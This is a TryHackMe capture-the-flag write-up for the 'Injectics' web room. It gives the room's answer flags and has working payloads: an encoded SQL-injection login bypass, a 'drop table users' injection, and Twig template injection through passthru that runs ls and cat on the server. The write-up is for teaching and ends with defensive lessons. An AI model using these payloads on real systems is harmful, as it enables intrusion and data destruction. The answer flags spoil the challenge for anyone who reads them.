# Injectics — TryHackMe Writeup

## Overview

**Room:** [Injectics](https://tryhackme.com/room/injectics)

Injectics is a web exploitation challenge that chains together several vulnerabilities rather than relying on a single bug. The attack path is essentially:

**Recon → Information disclosure → SQL Injection → Authentication bypass → SSTI → Database manipulation → Admin access → SSTI → RCE → Final flag**

The interesting part is how each vulnerability feeds into the next. The SQL injection gets us into the application, the first SSTI allows manipulation of the database, and the privileged SSTI eventually provides command execution.

---

# 1. Reconnaissance

I started with a full TCP port scan to identify the exposed services:

```bash
nmap -p- -sS -T4 <MACHINE_IP>
```

The scan revealed two interesting ports:

```text
20/tcp   open
80/tcp   open
```

Since the application was clearly web-based, I moved on to directory and file enumeration.

---

# 2. Web Enumeration

I used Gobuster with common extensions to look for interesting files:

```bash
gobuster dir -u http://<MACHINE_IP>/ \
-w /usr/share/wordlists/dirb/common.txt \
-x js,json,php
```

Among the results were:

```text
/login.php
/composer.json
/phpmyadmin
```

Each of these immediately gave us useful information:

- **`login.php`** — authentication endpoint.
    
- **`composer.json`** — exposed the application's PHP dependencies.
    
- **`phpmyadmin`** — indicated that MySQL was being used.
    

The exposed `composer.json` was particularly interesting because it showed that the application was using **Twig 2.14**.

That made **Server-Side Template Injection (SSTI)** something worth keeping in mind.

---

# 3. Inspecting the Website

Opening the main site revealed a page displaying medals for athletes from different countries.

I inspected the page source and found a comment referencing:

```text
mail.log
```

Navigating to the file revealed an important piece of information about the application's database recovery mechanism.

The log indicated that if the `users` table was removed or corrupted, the application would regenerate default accounts and record their credentials.

That was potentially extremely useful.

Instead of trying to brute-force an account, the goal became:

> Find a way to manipulate the database so that the application regenerates its default users.

---

# 4. SQL Injection in `login.php`

I started testing the login form for SQL injection.

A basic quote:

```text
'1
```

resulted in an error indicating that certain characters or keywords were being filtered.

Looking further into the application revealed a JavaScript filter containing blocked SQL keywords such as:

```text
OR
AND
```

This was a classic example of a client-side blacklist.

Client-side filtering is not a security boundary because the browser is controlled by the user. Instead of submitting the payload through the normal interface, I sent the request directly using Burp Suite.

The filter could be bypassed by encoding the payload:

```text
1%27%20||%201=1%20--+
```

Once decoded, this corresponds to:

```sql
1' || 1=1 -- 
```

The important point is that the application ultimately receives SQL syntax that changes the logic of the query, while the browser-side blacklist never sees the original form.

The authentication check was successfully bypassed.

I was now authenticated as:

```text
dev
```

---

# 5. Finding SSTI

With access to the dashboard, I started testing the medal-editing functionality.

I entered:

```text
21*21
```

into the relevant fields.

The application returned:

```text
441
```

That was a major clue.

The application wasn't simply storing the input as text — it was evaluating it through the template engine.

Since the application was using Twig, this indicated **Server-Side Template Injection**.

The vulnerability was therefore not just an input-validation problem. User-controlled data was being incorporated into a server-side template in an unsafe way.

---

# 6. Using SSTI to Manipulate the Database

Remember the `mail.log` discovery?

The application regenerated default users when the `users` table was deleted.

So I used the discovered template injection to submit SQL intended to remove the table:

```text
21; drop table users -- 
```

The application processed the input and triggered its database recovery/reinitialization behavior.

After waiting for the application to reload, I returned to the login page and used the credentials disclosed in `mail.log`.

This time I was able to authenticate as:

```text
admin
```

The first flag was displayed in the administrator interface.

### First flag

```text
THM{INJECTICS_ADMIN_PANEL_007}
```

At this point, the attack chain had progressed from:

```text
SQL Injection
      ↓
Authentication bypass
      ↓
SSTI
      ↓
Database manipulation
      ↓
Admin account regeneration
```

---

# 7. Investigating the Admin Panel

The administrator account exposed additional functionality, including a **Profile** section.

I began testing the profile fields for the same type of template injection.

The **First Name** field behaved differently from the earlier vulnerable input: it accepted strings as well as numerical expressions.

That made it possible to test actual Twig expressions.

The result confirmed that this field was also being processed by Twig.

So we now had a privileged SSTI primitive.

---

# 8. From SSTI to RCE

The next objective was to determine whether the SSTI could be escalated into operating-system command execution.

I used:

```twig
{{['ls ./flags',""]|sort('passthru')}}
```

The `passthru` callback caused the `ls` command to execute.

The response revealed the contents of the `flags` directory.

One of the files had the following name:

```text
5d8af1dc14503c7e4bdc8e51a3469f48.txt
```

This gave us the exact filename needed for the final step.

---

# 9. Retrieving the Final Flag

I then used the same SSTI-to-command-execution technique to read the file:

```twig
{{['cat ./flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',""]|sort('passthru')}}
```

The application executed the command and returned the contents of the file.

### Final flag

```text
THM{5735172b6c147f4dd649872f73e0fdea}
```

---

# Attack Chain

The complete exploitation path was:

```text
Full port scan
      ↓
Web enumeration
      ↓
composer.json disclosure
      ↓
Twig 2.14 identified
      ↓
mail.log discovered
      ↓
SQL Injection in login.php
      ↓
Authentication bypass
      ↓
dev account
      ↓
SSTI in medal editing
      ↓
Delete users table
      ↓
Application regenerates accounts
      ↓
Default admin credentials
      ↓
Admin access
      ↓
SSTI in First Name field
      ↓
Twig → passthru()
      ↓
Remote Command Execution
      ↓
Enumerate flags directory
      ↓
Read hidden flag
```

---

# Key Lessons

### 1. Client-side security controls aren't security boundaries

The application attempted to block SQL keywords in JavaScript. That doesn't protect the backend because an attacker can communicate with the endpoint directly.

**Always enforce validation and authorization server-side.**

### 2. Information disclosure can completely change an attack

The exposed `mail.log` revealed how the application's account-recovery mechanism worked.

A seemingly harmless log file ended up providing the information necessary to obtain administrative access.

### 3. SSTI can be much more serious than simple template manipulation

The initial `21*21 → 441` test established that our input was being evaluated.

From there, the vulnerable template functionality eventually provided command execution.

The severity of SSTI depends heavily on the template engine, its configuration, and what functionality is accessible from the template context.

### 4. Chained vulnerabilities are often more important than individual vulnerabilities

None of the discoveries should be viewed in isolation:

- The SQL injection bypassed authentication.
    
- SSTI provided database manipulation.
    
- Database manipulation triggered account regeneration.
    
- The regenerated account provided administrator access.
    
- The privileged SSTI provided RCE.
    
- RCE allowed the final flag to be read.
    

That chain is the real lesson of **Injectics**.

---

## Answers

**1. What is the flag value after logging into the admin panel?**

```text
THM{INJECTICS_ADMIN_PANEL_007}
```

**2. What is the content of the hidden text file in the flags folder?**

```text
THM{5735172b6c147f4dd649872f73e0fdea}
```

**Final takeaway:** Injectics is a great example of why web security isn't just about finding _one_ vulnerability. The real breakthrough comes from understanding how seemingly separate weaknesses can interact and turn a low-privileged web foothold into full application-level command execution.